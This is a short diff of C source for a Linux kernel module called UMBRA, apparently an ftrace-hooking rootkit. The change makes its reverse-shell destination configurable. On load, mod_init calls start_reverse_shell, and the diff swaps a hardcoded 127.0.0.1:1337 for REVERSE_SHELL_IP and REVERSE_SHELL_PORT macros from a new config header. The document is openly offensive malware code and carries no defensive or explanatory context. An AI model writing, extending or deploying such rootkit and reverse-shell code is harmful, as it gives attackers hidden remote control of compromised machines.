@@ -14,6 +14,7 @@
 #include "include/ftrace_manager.h"
 #include "include/hookers.h"
 #include "include/utils.h"
+#include "include/CONFIG.h"
 
 #if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
 #define VERSION_NOT_SUPPORTED
@@ -45,7 +46,7 @@ static int __init mod_init(void){
         return err;
     }
     printk(KERN_INFO "UMBRA:: Successfully loaded\n");
-    start_reverse_shell("127.0.0.1", "1337");
+    start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
     return 0;
 }
 
